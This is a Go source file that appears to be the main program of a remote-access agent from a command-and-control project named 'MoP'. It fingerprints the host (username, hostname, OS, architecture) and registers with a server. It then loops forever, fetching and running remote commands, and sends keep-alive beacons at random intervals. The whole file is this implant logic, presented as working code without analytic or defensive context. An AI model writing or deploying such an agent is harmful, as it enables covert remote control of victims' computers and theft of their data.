package main

import (
	"MoP/src/commands"
	"MoP/src/models"
	"MoP/src/requests"
	"crypto/md5"
	"encoding/hex"
	"log"
	"math/rand"
	"os"
	"os/user"
	"runtime"
	"time"
)

var (
	Name        string
	Agent       models.NewAgent
	TimeToSleep = 10
)

func init() {
	Agent := generateName()
	requests.Presentation(Agent)

}

func main() {

	go imAlive(Agent)

	for {
		comm := requests.GetCommand(Agent)
		for _, com := range comm {
			commands.HandleAgentCommands(com.ID, com.Command, Agent)
		}

		time.Sleep(time.Duration(commands.HTB()) * time.Second)
	}

}

func imAlive(agent models.NewAgent) {

	for {
		requests.AliveRequest(agent.Name)
		t := rand.Intn(240)
		time.Sleep(time.Duration(t) * time.Second)
	}

}

func generateName() models.NewAgent {

	getUser, err := user.Current()
	if err != nil {
		log.Fatal("")
	}
	Agent.Username = getUser.Username

	Agent.Hostname, err = os.Hostname()
	if err != nil {
		log.Fatal("")
	}

	Agent.SO = runtime.GOOS
	Agent.Arch = runtime.GOARCH

	hasher := md5.New()
	hasher.Write([]byte(Agent.Username + Agent.Hostname))

	Agent.Name = hex.EncodeToString(hasher.Sum(nil))

	return Agent
}
